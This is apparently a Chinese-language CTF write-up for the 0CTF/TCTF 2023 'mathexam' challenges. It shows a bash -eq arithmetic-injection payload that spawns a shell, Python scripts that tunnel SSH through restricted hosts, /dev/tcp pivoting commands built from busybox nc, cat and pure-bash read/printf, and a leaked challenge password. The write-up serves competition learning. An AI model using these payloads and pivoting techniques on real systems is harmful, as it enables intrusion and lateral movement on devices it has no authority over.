---
title: 0CTF/TCTF 2023 Mathexam Writeup
date: 2023-12-11 10:29:48
categories:
- CTF
tags:
- bash
- ssh
- tunnel
- 0ctf 2023
mermaid: true
image:
  path: /assets/images/0ctf-2023.png

toc: true
---

# 0CTF Mathexam Writeup
mathexam 系列非常有意思，主要考察如何在受限的 bash 下完成端口转发，题目的场景可以适用到一些小设备的渗透中。利用思路总结如下：
1. mathexam-1：bash -eq 注入
2. mathexam-2：利用 busybox nc 完成端口转发。
3. mathexam-3：去掉了 buxybox，利用 cat 完成端口转发。
4. mathexam-4：进一步去掉了 cat，需要利用纯粹的 bash 完成端口转发。

## mathexam-1
> The math exam starts now. Participate with integrity and never cheat.
> 
> Someone has stolen the exam paper, and definitely he got full marks.
> Fortunately, he didn't find the flag. 

```bash
#!/bin/bash

echo "You are now in the math examination hall."
echo "First, please read exam integrity statement:"
echo ""

promisetext="I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment"
echo "$promisetext"
echo ""

echo "Now, write down the exam integrity statement here:"
read userinput

if [ "$userinput" = "$promisetext" ]
then
    echo "All right"
else
    echo "Error"
    exit
fi

echo ""
echo "Exam starts"
echo "(notice: numbers in dec, oct or hex format are all accepted)"
echo ""

correctcount=0
for i in {1..100}
do
    echo "Problem $i of 100:"
    echo "$i + $i = ?"

    ans=$(($i+$i))
    read line

    if [[ "$line" -eq "$ans" ]]
    then
        correctcount="$(($correctcount+1))"
    fi
    echo ""
done

echo "Exam finishes"
echo "You score is: $correctcount"

exit
```
题目给了一个 bash 脚本，获取用户输入并使用 -eq 进行了比较。bash 脚本中这样的语句是可以注入的：`[[ "$VAR" -eq "something" ]]`，具体可参考文章：[Arithmetic operation in shell script can be exploited - DEV Community](https://dev.to/greymd/eq-can-be-critically-vulnerable-338m)

注入 poc：
```bash
x[$(command)]
```
测试命令时可以发现题目会将错误输出出来，但是标准输出看不到，因此我们将标准输出重定向到错误输出。另外目标环境有 busybox，可以使用下面的 payload 打开交互式 shell，就可以拿到 flag1。
```bash
x[$(/bin/busybox sh 1>&2)]
```


## mathexam-2
拿到第一关 shell 后，可以在根目录中找到一个 .connect.sh.swp 文件，获取该文件的内容可知 second 主机的用户名密码为 ctf:x5kdkwjr8exi2bf70y8g80bggd2nuepf。

获取第二关的 flag 要求我们 ssh 登陆到 second 主机中，但目标环境设置了诸多限制：
1. 没有 ssh
2. 仅有的二进制文件都在 /bin 目录下
    ```bash
    drwxr-xr-x    1 0        0             4096 Dec 10 00:11 .
    drwxr-xr-x    1 0        0             4096 Dec 10 00:11 ..
    -rwxr-xr-x    1 0        0          1396520 Dec  9 18:44 bash
    -rwxr-xr-x    1 0        0          2193264 Dec 10 00:11 busybox
    -rwxr-xr-x    1 0        0            35280 Dec 10 00:11 cat
    -rwxr-xr-x    1 0        0           138208 Dec 10 00:11 ls
    lrwxrwxrwx    1 0        0                4 Dec  9 18:44 sh -> bash
    ```
3. 当前用户对所有文件都没有写权限。

也就是说我们需要利用 busybox、bash、cat 来做端口转发，具体思路如下：
1. 通过 busybox nc 连接到 second。此时 busybox nc 与 ssh 服务建立起了 TCP 连接。
   ```bash
   busybox nc second 22
   ```
2. 我们只需要在该连接中收发数据即可完成 ssh 认证，我们可以通过 python 中的 subprocess 模块来控制终端数据的收发，以此来实现端口转发。

编写脚本如下。

```py
import subprocess
import threading
import select,os,time
# 命令和参数
command = ["nc", "-X", "connect", "-x", "instance.0ctf2023.ctf.0ops.sjtu.cn:18081", "kctgxr4bjb6kgj26", "1"]

# 启动进程
process = subprocess.Popen(
    command, 
    stdin=subprocess.PIPE, 
    stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE,
    bufsize=0  # 设置为 0 以关闭缓冲
)

thread_close = 0

def read_output(process):
    while True:
        if thread_close==1:
            break
        # 检查是否有数据可读
        reads, _, _ = select.select([process.stdout], [], [], 0.1)
        if reads:
            # 获取文件描述符
            fd = process.stdout.fileno()
            # 读取可用的数据
            output = os.read(fd, 4096)  # 读取最多 4096 字节
            if output:
                print(output.decode(), end='')

# 创建并启动线程
thread = threading.Thread(target=read_output, args=(process,))
thread.start()

# 发送命令
process.stdin.write(b"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment\n")
process.stdin.flush()
time.sleep(1)
process.stdin.write(b"x[$(/bin/busybox sh 1>&2)] \n")
process.stdin.flush()
process.stdin.write(b"busybox ping -c 1 second\n")
process.stdin.flush()

#监听端口，建立通道
import socket

# 设置监听端口
listen_port = 3333

# 创建 socket 对象
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(('0.0.0.0', listen_port))
server_socket.listen(1)
print(f"Listening on port {listen_port}...")

# 接受一个连接
client_socket, addr = server_socket.accept()
print(f"Connection from {addr} established.")
thread_close=1
# 等待线程结束
thread.join()
process.stdin.write(b"busybox nc second 22\n")
process.stdin.flush()


def socket_read_output(process):
    while True:
        # 检查 process.stdout 是否有数据可读
        reads, _, _ = select.select([process.stdout, client_socket], [], [], 0.1)
        # 如果 process.stdout 有数据可读，则将数据发送到客户端
        if process.stdout in reads:
            fd = process.stdout.fileno()
            output = os.read(fd, 4096)
            if output:
                client_socket.sendall(output)

def socket_write_output(process):
    while True:
        # 使用 select 监测客户端 socket 是否有数据可读
        reads, _, _ = select.select([client_socket], [], [], 0.1)
        # 如果客户端有数据可读，则将数据发送到 process.stdin
        if client_socket in reads:
            data = client_socket.recv(4096)
            if data:
                process.stdin.write(data)
                process.stdin.flush()


thread1 = threading.Thread(target=socket_read_output, args=(process,))
thread1.start()
thread2 = threading.Thread(target=socket_write_output, args=(process,))
thread2.start()

thread1.join()
thread2.join()

client_socket.close()
server_socket.close()
print("Connection closed.")

exit(0)
```
执行该脚本后，会将本地的 3333 端口转发到 second 的 22 端口，这样我们就可以连接到 second 了。
## mathexam-3
连接到 second 后，flag 文件中会提示第三关的 flag 在 third 主机上，用户名密码不变，我们需要再构建一层代理。不同在与 second 主机中将 busybox 移除了。

没有 nc 的情况下，我们仍然可以使用 exec 或者 cat 连接到远程端口，参考：
- [Some useful tips about /dev/tcp | Andrea Fortuna](https://andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/)
比如：
```bash
cat </dev/tcp/time.nist.gov/13
```
或者使用 exec 将 tcp 连接绑定到描述符 3,然后通过 echo 或者 cat 收发数据。
```bash
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
```
根据这个原理，我们就可以构建出一个类似的收发窗口：
```bash
exec 3<>/dev/tcp/third/22   
cat <&3 &
cat >&3
```

1. 前两行代码可以替代 `busybox nc third 22`，利用 & 可以将读取远程消息的任务放在后台，一旦接收到数据，就可以直接打印在标准输出中。
2. cat >&3 会等待用户的输入，用户输入之后会重定向到描述符 3 中，python 脚本中就可以直接用 process.stdin.write 发数据就可以了。 

利用脚本与上一关的类似，在此前的脚本中做修改即可，需要注意的就是需要在收发前，先执行上面构造的 payload。

exp2.py
```py
import subprocess
import threading
import select,os,time
import binascii

# 命令和参数
command = ["ssh", "ctf@127.0.0.1","-p","3333"]

...

# 创建并启动线程
thread = threading.Thread(target=read_output, args=(process,))
thread.start()
time.sleep(5) #手动输入密码 x5kdkwjr8exi2bf70y8g80bggd2nuepf

process.stdin.write(b"whoami\n")
process.stdin.flush()

...

listen_port = 4444

...

process.stdin.write(b"exec 3<>/dev/tcp/third/22\n")
process.stdin.write(b'cat <&3 & \n')
process.stdin.write(b"cat >&3\n")

...

```
利用时先运行 exp.py，然后运行 exp2.py。此时可以通过本地 4444 端口登陆 third。

## mathexam-4
进入了 third 主机后可以发现这一关将 cat 也去掉了，所以思路也比较明确，就是使用纯粹的 bash 内置命令来达到 cat 相同的效果。

bash 相关命令的使用可以参考：
- [Linux Bash Shell Scripting Tutorial Wiki](https://bash.cyberciti.biz/guide/Main_Page)

其中就提到了一些读写文件描述符的方法：read、echo、printf。比如文件写，我们可以通过 echo -ne 来写二进制数据。
```bash
echo -ne "\xf0\x00\x00\x00\x12\x00" >&3
```
这样就可以替代 cat 来写数据：
```bash
cat >&3
```

读取数据可以使用 read 来代替，read 可以使用 -u 参数指定文件描述符，逐行获取内容后使用 echo 输出到终端。
```bash
while read -u 3 -r line;do echo -ne "$line\n";done
```
但测试的时候会发现经过 read 处理的数据发生了变化，所有的 \x00 都被吞掉了。
```bash
#!/bin/bash
echo -e "1123\x80\x00\x01\x80" | xxd

echo -e "1123\x80\x00\x01\x80" | while read -r line;
do 
echo -ne "$line\n" ;
done | xxd
```
read 读取到 \x00 时，并不会给变量 line 赋值 \x00，而是赋值 ''。因此我们可以逐字节读取，如果为空的话，就主动添加一个 \x00，同时给 read 添加 -n 和 -d 参数。两者一起使用可以达到逐字节读取的目的。
- -n 参数指定一次读取的字节数。
- -d 参数可以指定分隔符为空字符。
```bash
#!/bin/bash
echo -en "1123\x80\x00\x00\x00\x01\x80" | xxd

echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line;
do 
if [[ $line == '' ]] then
    echo -ne "\x00"
else
    echo -ne "$line"
fi
done | xxd
```
![20231211054258](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211054258.png)

当然,这里输出也可以使用 printf. printf 参数 %c 可以输出单个字节.

```bash
echo -en "1123\x80\x00\x00\x00\x01\x80" | xxd

echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line;
do 
if [[ $line == '' ]] then
    echo -ne "\x00"
else
    echo -ne "$line"
fi
done | xxd

echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line;
do 
    printf "%c" "$line"
done | xxd
```
![20231211074223](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211074223.png)

貌似一样了，但是如果用二进制文件测试的话，还是会发现结果不同，如下。
```bash
#!/bin/bash
cat /bin/cat | xxd > result_cat

cat /bin/cat | while read -r -d '' -n 1 line;
do 
if [[ $line == '' ]] then
    echo -ne "\x00"
else
    echo -ne "$line"
fi
done | xxd > result_echo

cat /bin/cat | while read -r -d '' -n 1 line;
do 
    printf "%c" "$line"
done | xxd > result_printf
```
例如 \x20 经过 read 之后也会变成 ''。这是由于 \x20 为空格，属于 bash 中的分隔符（IFS），因此经过 read 之后也会变成 ''，默认情况下，IFS 的值包括空格、制表符和换行符。

但 read 可以指定 IFS 的值。IFS= 可以将分隔符设置为 ''。
```bash
#!/bin/bash
cat /bin/cat | xxd > result_cat

cat /bin/cat | while IFS= read -r -d '' -n 1 line;
do 
if [[ $line == '' ]] then
    echo -ne "\x00"
else
    echo -ne "$line"
fi
done | xxd > result
```
但这样又发现了新的一些问题：
1. printf 和 echo 的输出在处理某些内容时还是会不一致。
2. read 在处理某些字符串时会吞掉一部分 \x00。比如：当输入字符串有 3 个 \x00 相邻时，会被吞掉一个。
```bash
#!/bin/bash
echo -en "\xf0\x00\x00\x00\x12\x00"
```
![20231211060804](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211060804.png)

不管是使用 printf 还是 echo, 结果都是一样的，直接调试 bash 也能发现是 read 的问题。

emmm，实在是很难构造出完全相同的数据。硬着头皮试的时候突然发现，printf %c 输出的数据是可以正常用于 ssh 通信，但 echo -ne 输出的数据会导致 ssh 卡住。。。。

由此可以在 exp2.py 的基础上进行修改（仅标明了修改部分）得到 exp3.py
```py
# 命令和参数
command = ["ssh", "ctf@127.0.0.1","-p","4444"]
...

listen_port = 5555

...

process.stdin.write(b"exec 3<>/dev/tcp/fourth/22\n") #exec 3<>/dev/tcp/fourth/22
process.stdin.write(b'''while IFS= read -r -d '' -u 3 -n 1 byte ; do printf "%c" "$byte"; done &\n''')
process.stdin.flush()
...

def trans(bytess):
    out = []
    hex_string = binascii.hexlify(bytess).decode('utf-8')
    for i in range(len(hex_string)):
        if i % 2 == 0:
            out.append('\\x'+hex_string[i:i+2])
    connect_cmd = f'''echo -ne "{''.join(out)}" >&3 & \n'''
    print(connect_cmd)
    # os.system(connect_cmd)
    return connect_cmd.encode()

    ...

def socket_write_output(process):
    while True:
            ...
                process.stdin.write(trans(data))
            ...
```
依次运行 exp.py ~ exp3.py

然后就可以通过 5555 端口连接上 fourth 了。进去之后没有 cat、可以使用 `exec </flag4` 读取 flag。

![20231211080409](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211080409.png)

总结：由于受到 read 的影响，printf 和 echo 都没法完全还原二进制文件的内容，但 printf %c 可以正常用于 ssh 通信，但 echo -ne 不行，还得根据具体协议分析，添加更多的字符串转换才能够提高兼容性。

后话，bash 原生命令下，如何完整获取二进制文件的内容呢？我找到了 stackexchange 上的一个解答：[linux - bash can't store hexvalue 0x00 in variable - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/347390/bash-cant-store-hexvalue-0x00-in-variable)

利用 readarray 可以将带有特殊字符的内容存在数组中，然后再拼接输出。这种方式可以完整获取任意文件的完整内容，即使是二进制文件。
```bash
readarray -d $'\0' zArray </etc/passwd
[[ "${zArray[*]}" ]] && printf '%s\0' "${zArray[@]}"
```
但在这道题的场景下，readarray 不太好用，如果用来读取连接中的 fd 的话，readarray 会被阻塞住，导致 zArray 无法被赋值，后面的 printf 也就读不出内容。

## 补充： 
参考了其他大佬的 writeup：
- [ctf/2023.12.09-0CTF\_TCTF\_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f · mephi42/ctf](https://github.com/mephi42/ctf/blob/43222e15e7cb74844b2c686c4f32cccf74e7909f/2023.12.09-0CTF_TCTF_2023/mathexam%20-%204/script)

writeup 作者额外设置了 LC_ALL 环境变量为 C。

```bash
LC_ALL=C
```

LC_ALL 环境变量用于覆盖所有其他本地化设置，它通常用于确保在特定程序运行时使用特定的语言环境。C 语言环境是最简单的语言环境，其中字符是单字节的，字符集是 ASCII，排序顺序基于字节值。

加入该环境变量之后，read 就不会将多个字符解析成一个特殊字符，从而解决上面 \x00 缺失的问题，测试脚本如下：
```bash
#!/bin/bash
echo -en "\xf0\x00\x00\x00\x12\x00" | xxd

echo -en "\xf0\x00\x00\x00\x12\x00" | while LC_ALL=C IFS= read -r -d $'\0' -n 1 line;
do 
printf "%c" "$line"
done | xxd


echo -en "\xf0\x00\x00\x00\x12\x00" | while LC_ALL=C IFS= read -r -d $'\0' -n 1 line;
do 
if [[ -z $line ]] then
    echo -ne "\x00"
else
    echo -ne "$line"
fi
done | xxd
```

![20231211201433](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211201433.png)

使用二进制文件来测试也可以完全一致，可以说具备通用性了！


# 参考
- [HTB: Interface - 0xdf hacks stuff](https://0xdf.gitlab.io/2023/05/13/htb-interface.html)
- [Arithmetic operation in shell script can be exploited - DEV Community](https://dev.to/greymd/eq-can-be-critically-vulnerable-338m)
- [linux - bash can't store hexvalue 0x00 in variable - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/347390/bash-cant-store-hexvalue-0x00-in-variable)
- [ctf/2023.12.09-0CTF\_TCTF\_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f · mephi42/ctf](https://github.com/mephi42/ctf/blob/43222e15e7cb74844b2c686c4f32cccf74e7909f/2023.12.09-0CTF_TCTF_2023/mathexam%20-%204/script)